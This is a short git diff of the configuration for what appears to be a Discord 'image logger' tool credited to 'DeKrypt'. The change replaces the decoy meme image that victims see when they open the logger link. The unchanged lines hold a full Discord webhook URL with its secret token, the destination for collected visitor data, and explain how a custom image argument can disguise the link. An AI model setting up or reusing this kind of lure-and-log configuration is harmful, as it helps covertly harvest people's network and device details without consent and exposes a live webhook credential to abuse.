@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1451296620556718162/iih9pYNT0lkaUKHBQw2EuJb13WsGiAdnVBi8XuOb2Xa_m5OJd4HyGPETHVvkCWeXdrMz",
-    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5u1bmWeZLEpDas_VtOnSuFT6rsX9VPFRg59y3tUdcFIcoyTYCOPCdlpoH3nV7pCkGm7Mu1C8umzqS29xmuVHpKC5C_wuR4ZzfTJFLEF8iH5O8_jNvX-MO-CyJWxbz3qAnXBgiVSPncXQZ7-0XsBoR4es6rzkuRKOFOlzhCfHC1Iq_bWagMKaITp_nBr3u/s1221/every-doakes-meme-2025-dexter.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/fc/3f/3e/fc3f3e5c03ec567252c5de356d16cf5e.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
